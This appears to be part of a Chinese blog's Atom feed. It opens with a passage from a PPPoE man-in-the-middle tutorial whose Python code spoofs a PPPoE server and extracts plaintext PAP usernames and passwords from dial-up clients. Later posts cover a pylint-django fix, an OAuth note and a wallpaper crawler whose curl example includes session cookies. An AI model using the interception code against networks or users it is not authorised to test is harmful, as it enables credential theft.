Config-Rej，这也就意味着自己必须修改相应配置参数的期望值，然后向对方重新发送一个Config-Request报文，且等待对方新的回应。</p><p>但是就我抓到的过程中，没看见过在这个阶段有 Config-Nak 的出现。</p><p>有了上面的基础，我们再来看我的抓包历史记录</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/Packet_LCP_History_20190512221121.png" alt=""></p><p>其实大多不用管，只需要知道收到一个 Config-Request 得回一个 Config-Ack，并且自己也得发一个 Config-Request，并等待接收到对方的 Config-Ack。</p><p>但是我抓了好几次包，测试了不少次，发现一般情况下，一方在第一次接收到对方的 Config-Request 报文时会回应一个 Config-Rej。后续才开始对接收到的 Config-Request 回应 Config-Ack。</p><p>据此我们可以写出代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#处理 PPP LCP 请求</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_lcp</span><span class="params">(self, pkt)</span>:</span></span><br><span class="line">    <span class="comment"># 初始化 clientMap</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.clientMap.get(pkt.src):</span><br><span class="line">        self.clientMap[pkt.src] = &#123;<span class="string">"req"</span>: <span class="number">0</span>, <span class="string">"ack"</span>: <span class="number">0</span>&#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 处理 LCP-Configuration-Req 请求</span></span><br><span class="line">    <span class="keyword">if</span> bytes(pkt.payload)[<span class="number">8</span>] == <span class="number">0x01</span>:</span><br><span class="line">        <span class="comment"># 第一次 LCP-Configuration-Req 请求返回 Rej 响应包</span></span><br><span class="line">        <span class="keyword">if</span> self.clientMap[pkt.src][<span class="string">'req'</span>] == <span class="number">0</span>:</span><br><span class="line">            self.clientMap[pkt.src][<span class="string">'req'</span>] += <span class="number">1</span></span><br><span class="line">            print(<span class="string">"第 %d 次收到LCP-Config-Req"</span> % self.clientMap[pkt.src][<span class="string">"req"</span>])</span><br><span class="line">            print(<span class="string">"处理Req请求，发送LCP-Config-Rej包"</span>)</span><br><span class="line">            self.send_lcp_reject_packet(pkt)</span><br><span class="line">            print(<span class="string">"发送LCP-Config-Req包"</span>)</span><br><span class="line">            self.send_lcp_req_packet(pkt)</span><br><span class="line">        <span class="comment"># 后面的 LCP-Configuration-Req 请求均返回 Ack 响应包</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.clientMap[pkt.src][<span class="string">'req'</span>] += <span class="number">1</span></span><br><span class="line">            print(<span class="string">"第 %d 次收到LCP-Config-Req"</span> % self.clientMap[pkt.src][<span class="string">"req"</span>])</span><br><span class="line">            print(<span class="string">"处理Req请求，发送LCP-Config-Ack包"</span>)</span><br><span class="line">            self.send_lcp_ack_packet(pkt)</span><br><span class="line">    <span class="comment"># 处理 LCP-Configuration-Rej 请求</span></span><br><span class="line">    <span class="keyword">elif</span> bytes(pkt.payload)[<span class="number">8</span>] == <span class="number">0x04</span>:</span><br><span class="line">        print(<span class="string">"处理Rej请求，发送LCP-Config-Req包"</span>)</span><br><span class="line">        self.send_lcp_req_packet(pkt)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理 LCP-Configuration-Ack 请求</span></span><br><span class="line">    <span class="keyword">elif</span> bytes(pkt.payload)[<span class="number">8</span>] == <span class="number">0x02</span>:</span><br><span class="line">        self.clientMap[pkt.src][<span class="string">'ack'</span>] += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"第 %d 收到LCP-Config-Ack"</span> % self.clientMap[pkt.src][<span class="string">"ack"</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>clientMap 请无视，最开始是打算支持多个 client，并做记录使用，但是发现拦截根本不用实现这个。</p><p>其中的方法我们先不展开，到时候会给大家把所有代码放上来，根据方法名大家应该能猜到是用来干嘛的。</p><h3 id="Authentication-阶段"><a href="#Authentication-阶段" class="headerlink" title="Authentication 阶段"></a>Authentication 阶段</h3><p>链路建立起来后，应该向下一个阶段跃迁，下一个阶段一般是 Authentication。一般来说就只有 PAP 和 CHAP。</p><p>CHAP 在高校拨号客户端中使用还并不算多，大多采用 PAP，所以 CHAP 我们暂且按下不表，相信要是你能看完这篇文章并自己动手实践的话，CHAP 的分析对你来说也是手到擒来。</p><p>在这里我们主要介绍 PAP 认证以及最最关键的环节：抓取账号密码。</p><p>PAP 的 Protocol 字段为 0xc023</p><p>PAP 包格式见下图</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PPP_PAP_20190512225749.png" alt=""></p><p>从中我们可以看到 CODE 字段为 1，代表一个 Authentication-Request。前面我们说过了，Identifier 字段在链路建立阶段，这个字段的值是一样的，然后跃迁到下一阶段后，这个字段的值随着每个请求递增。</p><p>PAP 包的认证方式是由被认证端主动发起，被认证端发送明文口令至认证端，由对方认证。</p><p>PAP 并不能防止重放和穷举等攻击，而 CHAP 是由认证端主动发起（challenge 挑战），具体的安全提升大家可以自行查阅相关资料。</p><p>其中的 CODE 字段我们可以参见下表</p><table><thead><tr><th>CODE 值</th><th>报文名称</th></tr></thead><tbody><tr><td>1</td><td>Authentication-Request</td></tr><tr><td>2</td><td>Authentication-Ack</td></tr><tr><td>3</td><td>Authentication-Nak</td></tr></tbody></table><p>我们所做的是拦截，所以我们只需要关心 Authentication-Request 的 Data 字段就好，Data 字段中，Peer-ID（用户名）字段，Password字段，它们都是明文的。</p><p>这里多说一点关于 Authentication-Ack 和 Authentication-Nak，如果认证成功，认证端会返回一个 Ack 并携带成功信息给被认证端，相反，认证失败会返回 Nak 并携带相关信息。</p><p>所以我们要做的就是在收到 Authentication-Request 包时解析出账号密码即可完成我们的小 demo 了。</p><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解析pap账号密码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_papinfo</span><span class="params">(self, pkt)</span>:</span></span><br><span class="line">    <span class="comment"># pap-req</span></span><br><span class="line">    _payLoad = bytes(pkt.payload)</span><br><span class="line">    <span class="keyword">if</span> _payLoad[<span class="number">8</span>] == <span class="number">0x01</span>:</span><br><span class="line">        _nUserLen = int(_payLoad[<span class="number">12</span>])</span><br><span class="line">        _nPassLen = int(_payLoad[<span class="number">13</span> + _nUserLen])</span><br><span class="line">        _userName = _payLoad[<span class="number">13</span>:<span class="number">13</span> + _nUserLen]</span><br><span class="line">        _passWord = _payLoad[<span class="number">14</span> + _nUserLen:<span class="number">14</span> + _nUserLen + _nPassLen]</span><br><span class="line">        print(<span class="string">"get User:%s,Pass:%s"</span> % (str(_userName), str(_passWord)))</span><br><span class="line">        <span class="comment">#self.send_pap_authreject(pkt)</span></span><br><span class="line">        <span class="keyword">if</span> pkt.src <span class="keyword">in</span> self.clientMap:</span><br><span class="line">            <span class="keyword">del</span> self.clientMap[pkt.src]</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"欺骗完毕...."</span>)</span><br></pre></td></tr></table></figure><p>0x01 即代表 CODE 字段的 Authentication-Request。我们只需要从这个包里面按照抓包中的格式进行解析即可获取账号密码。</p><p>总体完成代码我会放在文章最后</p><h2 id="遇到的一些坑"><a href="#遇到的一些坑" class="headerlink" title="遇到的一些坑"></a>遇到的一些坑</h2><p>就算是一个并不算很困难的东西，但是在做这个东西的过程中还是遇到了不少坑，我在这里记录一下，免得后人和我一样踩坑。</p><p>最开始我想着因为都是本机搭建 client 和 server，那么我直接把链路层的 source 和 destination 的 mac 都设置为本机的物理网卡 mac，也就是全部采用第一个 PADI 包中的 source mac，但是我发现<br>除了最开始的 PADI 和 PADO，后面的包，用 wireshark 根本抓不到，我猜想是不是两个 mac 相同的原因，导致包被丢弃了 client 没收到，或者 client 本身接到这个包，但是发现两个 mac 相同。<br>于是不继续发送 PADR 了，这个原因我并不明白，可以完整捕获流程的只能是 server 搭建在虚拟机或者网关也就是路由器。这个结果让我十分沮丧。然后我采用了几种我能想到的办法，但是均不奏效。</p><ol><li>最容易想到的应该是伪造 server mac 了。但并不能抓到，我怀疑是没办法找到这个 mac，可能丢弃了，但是我不理解为什么就算找不到应该也会发个包吧，不至于抓包记录都没有。</li><li>我用工具搭建了一个TAP网卡，我用 wireshark 看了下，包的流经是先经过 TAP 网卡，然后 TAP 会作为一个二层交换机，修改源 mac 和目标 mac 后发往以太物理网卡，然后我采用 server 监听 TAP 网卡，发响应包采用物理网卡，但是依旧是后续进行不下去，虽说这两个mac不一样，但是 client 那边依旧没响应，不知道是 client 丢弃了这个包还是说 client 那边没收到。</li></ol><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>当然这个问题到最后解决了，这里感谢一下老陈的指点。</p><p>其实比较简单，问题就是 npcap，毕竟 scapy 和 wireshark 都推荐这个，我也就采用了这个，但是就像前面所说的，就算伪造 mac，应该也会流经物理网卡，但是 npcap 本地发的包收不到client响应包。</p><p>所以采用 winpcap 就能正常了，包括两个 mac 相同也可以抓到。</p><p>至于这个具体是什么导致的，还是说是一个 bug，并不是太清楚。</p><h2 id="你还可以做哪些有趣的事情"><a href="#你还可以做哪些有趣的事情" class="headerlink" title="你还可以做哪些有趣的事情"></a>你还可以做哪些有趣的事情</h2><p>拦截以后，你可以自己配合自己的路由器进行拨号。</p><p>甚至大胆一点，你也可以尝试给客户端一个成功的 Authentication-Ack，看客户端会是什么效果，要是你继续模拟完整个流程，包括 IPCP，那么客户端会按照你的想法给你发送心跳包吗？</p><h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址"></a>代码地址</h2><p><a href="https://github.com/akkuman/pppoe-intercept" target="_blank" rel="noopener">PPPoE-Intercept</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.sunflyer.cn/archives/460" target="_blank" rel="noopener">How To : 从Netkeeper 4.X客户端获取真实账号</a></li><li><a href="https://datatracker.ietf.org/doc/rfc2516/" target="_blank" rel="noopener">RFC 2516 - A Method for Transmitting PPP Over Ethernet (PPPoE)</a></li><li><a href="https://datatracker.ietf.org/doc/rfc1570/" target="_blank" rel="noopener">RFC 1570 - PPP LCP Extensions</a></li><li><a href="https://datatracker.ietf.org/doc/rfc1661/" target="_blank" rel="noopener">RFC 1661 - The Point-to-Point Protocol (PPP)</a></li><li><a href="https://wenku.baidu.com/view/e644ba4f33687e21af45a916" target="_blank" rel="noopener">点到点协议PPP-百度文库</a></li><li><a href="http://support.huawei.com/huaweiconnect/enterprise/huawei/m/ViewThread.html?tid=364813" target="_blank" rel="noopener">PPP（three P）基本原理</a></li><li><a href="https://github.com/Karblue/PPPoE-hijack" target="_blank" rel="noopener">PPPoE-hijack</a></li><li><a href="http://www.360doc.com/content/12/0312/20/3725126_193822217.shtml" target="_blank" rel="noopener">PPPoE工作原理以及PPPoE帧格式</a></li></ul><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>感谢踩坑无助的时候<a href="https://blog.sunflyer.cn/" target="_blank" rel="noopener">老陈</a>的提点</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于&lt;a href=&quot;https://www.anquanke.com/post/id/178484&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PPPoE中间人拦截以及校园网突破漫谈&lt;/a&gt;，转载请注明出处。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;PPPoE中间人拦截以及校园网突破漫谈&quot;&gt;&lt;a href=&quot;#PPPoE中间人拦截以及校园网突破漫谈&quot; class=&quot;headerlink&quot; title=&quot;PPPoE中间人拦截以及校园网突破漫谈&quot;&gt;&lt;/a&gt;PPPoE中间人拦截以及校园网突破漫谈&lt;/h1&gt;&lt;p&gt;校园生活快结束了，之前还有点未完成的想法，趁着这两天有兴趣搞搞。&lt;/p&gt;
&lt;p&gt;此文面向大众是那种在校园内苦受拨号客户端的毒害，但是又想自己动手折腾下的。&lt;/p&gt;
    
    </summary>
    
      <category term="网络协议" scheme="http://hacktech.cn/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
    
      <category term="网络协议" scheme="http://hacktech.cn/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>vscode打开django项目pylint提示has not &quot;object&quot; member</title>
    <link href="http://hacktech.cn/2019/04/28/vscode-django-pylint-error.html"/>
    <id>http://hacktech.cn/2019/04/28/vscode-django-pylint-error.html</id>
    <published>2019-04-27T21:41:57.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<p>vscode 打开 django 项目提示 has not “object” member 是因为 Django 动态地将属性添加到所有模型类中，所以 ide 无法解析。</p><a id="more"></a><p>解决方案：</p><ol><li>安装 pylint-django</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U pylint-django</span><br></pre></td></tr></table></figure><ol start="2"><li>启用 pylint-django</li></ol><p>打开项目下自动生成的 .vscode 文件夹下的 setting.json 文件，添加下面的配置项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;python.linting.pylintArgs&quot;: [</span><br><span class="line">        &quot;--load-plugins=pylint_django&quot;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;vscode 打开 django 项目提示 has not “object” member 是因为 Django 动态地将属性添加到所有模型类中，所以 ide 无法解析。&lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>从客户端取到浏览器返回的oauth凭证</title>
    <link href="http://hacktech.cn/2019/04/26/get-auth-and-back-to-client.html"/>
    <id>http://hacktech.cn/2019/04/26/get-auth-and-back-to-client.html</id>
    <published>2019-04-26T02:14:33.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<p>这个随便记录一下，也是朋友问我的一个问题。</p><p>在网上找了下，没找到相关的，用英文也搜索了一下，可能我的关键词没找对，找了一会没找到。</p><a id="more"></a><p>想到以前用过的rclone也是用的这样的方式，去看了下相关部分源码。</p><p>解决方案是本地搭建一个 webserver 用来获取凭证，然后客户端就能拿到了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个随便记录一下，也是朋友问我的一个问题。&lt;/p&gt;
&lt;p&gt;在网上找了下，没找到相关的，用英文也搜索了一下，可能我的关键词没找对，找了一会没找到。&lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>打造一个壁纸爬虫来爬你的老婆</title>
    <link href="http://hacktech.cn/2019/03/13/wall-alphacoders-com-crawler.html"/>
    <id>http://hacktech.cn/2019/03/13/wall-alphacoders-com-crawler.html</id>
    <published>2019-03-12T23:07:57.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<p>好久没写东西了，随便水一篇文，也是比较简单的东西</p><a id="more"></a><p>可能每个喜欢二次元的人都有自己的老婆或者老公吧，之前在朋友那里看到了一个壁纸网站<a href="https://wall.alphacoders.com" target="_blank" rel="noopener">wall.alphacoders.com</a>，要是我想要亚丝娜的壁纸，只需要搜索她的英文名<code>Asuna</code>即可看到一千多张有关亚丝娜的壁纸。壁纸收集爱好者肯定就和我一样想把它们给下载到自己的电脑上幻灯片当作壁纸了，当然手工下载是不可能的，必须写下爬虫，分析下壁纸下载流程。</p><h2 id="请求分析"><a href="#请求分析" class="headerlink" title="请求分析"></a>请求分析</h2><p>首先我们<code>F12</code>打开开发者工具，在一张图上找到下载</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dqnaw51j20ac077777.jpg" alt=""></p><p>我们在开发者工具里面取元素，并没有看到下载链接，说明下载链接并没有包含在原始html中，但是点击是可以下载的，并且可以看到整个页面并没有进行刷新，判断是一个ajax请求，直接点进<code>XHR</code>，然后再次点击下载链接可以看到请求。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dw0idvpj212a0lwn62.jpg" alt=""></p><p>可以看到这个请求返回了一个链接，我们直接访问链接，发现是可以下载的，说明这就是下载链接了，那么这个链接是怎么来的呢？</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dy25rizj20o30d5gme.jpg" alt=""></p><p>我们看看请求，这个post请求里面有一些参数，我们先不去考虑这些参数怎么来的，我们先模拟一下请求看看请求Header里面有没有什么东西是必须的，这里直接上<code>postman</code>或者<code>curl</code>都可以，如果你的机器上面安装了<code>curl</code>我推荐用这个，因为<code>Chrome</code>开发者工具，直接可以在请求上右键<code>Copy as cURL</code>，直接可以帮你复制出curl命令，我这里复制出来是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;https://wall.alphacoders.com/get_download_link.php&quot; -H &quot;Pragma: no-cache&quot; -H &quot;Origin: https://wall.alphacoders.com&quot; -H &quot;Accept-Encoding: gzip, deflate, br&quot; -H &quot;Accept-Language: zh-CN,zh;q=0.9&quot; -H &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36&quot; -H &quot;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&quot; -H &quot;Accept: */*&quot; -H &quot;Cache-Control: no-cache&quot; -H &quot;X-Requested-With: XMLHttpRequest&quot; -H &quot;Cookie: __cfduid=d7ec945393d1b5ef3c28d4c9d12ef9fb11552315444; cookieconsent_status=allow; wa_session=1eogv8ehgn3itq5g4g8hfsducpkm9lbu46q893vrkhph3ued4rm89gvk7ck4fdg9k73cmrcdesoqj4crm1575vj3lfid9e67fpis661&quot; -H &quot;Connection: keep-alive&quot; -H &quot;Referer: https://wall.alphacoders.com/search.php?search=Asuna&quot; --data &quot;wallpaper_id=533007^&amp;type=png^&amp;server=images8^&amp;user_id=79150&quot; --compressed</span><br></pre></td></tr></table></figure><p>我们先去掉不必要的东西 <code>curl &quot;https://wall.alphacoders.com/get_download_link.php&quot; --data &quot;wallpaper_id=533007&amp;type=png&amp;server=images8&amp;user_id=79150&quot;</code> ，直接执行，发现可以获取到地址，所以现在要考虑的只有这些参数是怎么来的了，下面我同样放一张postman的图，可以看到是同样的可以获取到下载链接</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11e4cniksj20hq04lwek.jpg" alt=""><br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11e7mv54sj20tx0cvgm5.jpg" alt=""></p><p>这些参数我们从两方面考虑，一是用js算出来的，一个就是在html中存在的。</p><p>我们首先在html里找找看有没有。</p><p>通过关键字搜索页面html，我们可以找到每一张图都有一串类似于下面的属性 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data-id=&quot;533007&quot; data-type=&quot;png&quot; data-server=&quot;images8&quot; data-user-id=&quot;79150&quot;</span><br></pre></td></tr></table></figure><p>和上面的post参数是一一对应的。</p><p>所以爬取思路就出来了。</p><p>访问一个页面，取到每一个图的特定属性，然后构造post请求得到下载地址，然后访问地址下载图片</p><p>那新问题是如果进行翻页并且判断是否到了最后一页。</p><p>我们可以发现页数是通过get的网址决定的，<code>https://wall.alphacoders.com/search.php?search=asuna&amp;page=10</code> ，更改<code>page</code>后面的值即可。</p><p>判断是否到了尾页，我们可以打开最后一页，然后查看一下html，我们可以看到<code>下一页</code>按钮的链接已经变成了 <code>&lt;a id=&#39;next_page&#39; href=&#39;#&#39;&gt;Next&amp;nbsp;&amp;#62;&lt;/a&gt;</code> ·，那我们就可以根据<code>href</code>的值是否为 <code>#</code> 来判断了。</p><h2 id="Python库的选择"><a href="#Python库的选择" class="headerlink" title="Python库的选择"></a>Python库的选择</h2><p>唯一用到的第三方库就是 <code>Requests</code> ，以前解析html的Dom树喜欢用<code>BeautifulSoup</code>，但是后来发现解析速度上确实和re有很大差距，并且当html有很特殊的字符时会又是莫名出错，故工程量不大的情况下，我现在还是优选正则。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123; <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:1080"</span>, <span class="string">"https"</span>: <span class="string">"http://127.0.0.1:1080"</span>, &#125;</span><br><span class="line"><span class="comment">#proxies = &#123;&#125;</span></span><br><span class="line">download_dir = <span class="string">'./pic/'</span></span><br><span class="line">downloaded_num = <span class="number">0</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_pic</span><span class="params">(url, name, pic_type)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> proxies</span><br><span class="line">    <span class="keyword">global</span> download_dir</span><br><span class="line">    <span class="keyword">global</span> downloaded_num</span><br><span class="line">    <span class="keyword">global</span> total</span><br><span class="line">    <span class="comment"># if dir isn't exist, create a dir to download pic </span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download_dir):</span><br><span class="line">        os.makedirs(download_dir)</span><br><span class="line">    <span class="comment"># download pic to special dir</span></span><br><span class="line">    r = requests.get(url, proxies=proxies)</span><br><span class="line">    downloaded_num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'%s/%s.%s'</span>%(download_dir, name, pic_type), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">    print(<span class="string">'[&#123;:5d&#125;/&#123;&#125;] &#123;&#125;.&#123;&#125; Done!'</span>.format(downloaded_num, total, name, pic_type))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_download_link</span><span class="params">(wallpaper_id, wallpaper_type, server, user_id)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> proxies</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'wallpaper_id'</span>: wallpaper_id,</span><br><span class="line">        <span class="string">'type'</span>: wallpaper_type,</span><br><span class="line">        <span class="string">'server'</span>: server,</span><br><span class="line">        <span class="string">'user_id'</span>: user_id,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(<span class="string">'https://wall.alphacoders.com/get_download_link.php'</span>, data=post_data, proxies=proxies)</span><br><span class="line">    download_pic(r.text, wallpaper_id, wallpaper_type)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getwallpaper</span><span class="params">(keyword)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> proxies</span><br><span class="line">    <span class="keyword">global</span> total</span><br><span class="line">    p_nextpage = re.compile(<span class="string">r"&lt;a id='next_page' href=[\'\"](.+?)[\'\"]&gt;"</span>)</span><br><span class="line">    p_item = re.compile(<span class="string">r'data-id="(\d+?)" data-type="(\w+?)" data-server="(\w+?)" data-user-id="(\d+?)"'</span>)</span><br><span class="line">    page_num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r_page = requests.get(<span class="string">'https://wall.alphacoders.com/search.php?search=%s&amp;lang=Chinese&amp;page=%d'</span> % (keyword.lower(), page_num), proxies=proxies)</span><br><span class="line">        nextpage_link = p_nextpage.search(r_page.text)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># if there isn't any search result, it will exit the loop</span></span><br><span class="line">        <span class="keyword">if</span> nextpage_link == <span class="keyword">None</span>:</span><br><span class="line">            print(<span class="string">"Sorry, we have no results for your search!"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> page_num == <span class="number">1</span>:</span><br><span class="line">            total = int(re.search(<span class="string">r"&lt;h1 class='center title'&gt;\s+?(\d+)(.+?)\s+?&lt;/h1&gt;"</span>, r_page.text).group(<span class="number">1</span>))</span><br><span class="line">            print(<span class="string">"the %s wallpaper's total is %d"</span> % (keyword, total))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> p_item.findall(r_page.text):</span><br><span class="line">            wallpaper_id = item[<span class="number">0</span>]</span><br><span class="line">            wallpaper_type = item[<span class="number">1</span>]</span><br><span class="line">            server = item[<span class="number">2</span>]</span><br><span class="line">            user_id = item[<span class="number">3</span>]</span><br><span class="line">            get_download_link(wallpaper_id, wallpaper_type, server, user_id)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># if there isn't the next page's link, it will exit the loop</span></span><br><span class="line">        <span class="keyword">if</span> nextpage_link.group(<span class="number">1</span>) == <span class="string">'#'</span>:</span><br><span class="line">            print(<span class="string">"All wallpaper done!"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        page_num += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span> <span class="keyword">or</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">        usage_text = <span class="string">"Usage:\n\tpython getwallpaper.py miku [miki_pic]\nFirst param: the name of script\nSecond param: the wallpaper's keyword which you want to search\nThird param: the dir's name where you want to download in, optional, default in ./pic"</span></span><br><span class="line">        print(usage_text)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        download_dir = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">        getwallpaper(str(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        